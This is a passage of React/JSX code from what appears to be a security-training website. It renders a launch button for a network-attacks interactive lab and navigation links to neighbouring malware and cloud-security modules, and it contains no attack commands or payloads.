          <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1rem', color: accent, marginBottom: '0.5rem', fontWeight: 600 }}>MOD-08 Interactive Lab</div>
          <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#1a4a4a', marginBottom: '1.5rem' }}>21 steps &middot; 445 XP &middot; Real commands &middot; Flag captures</div>
          <Link href="/modules/network-attacks/lab" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.85rem', color: accent, padding: '12px 32px', border: '1px solid rgba(0,255,255,0.6)', borderRadius: '6px', background: 'rgba(0,255,255,0.1)', fontWeight: 700, letterSpacing: '0.12em', boxShadow: '0 0 20px rgba(0,255,255,0.15)', display: 'inline-block' }}>
            LAUNCH LAB &#8594;
          </Link>
        </div>
        <div style={{ display: 'flex', justifyContent: 'space-between' }}>
          <Link href="/modules/malware" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#1a4a4a' }}>&#8592; MOD-07: MALWARE</Link>
          <Link href="/modules/cloud-security" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#1a4a4a' }}>MOD-09: CLOUD SECURITY &#8594;</Link>
        </div>
      </div>
    </div>
  )
}
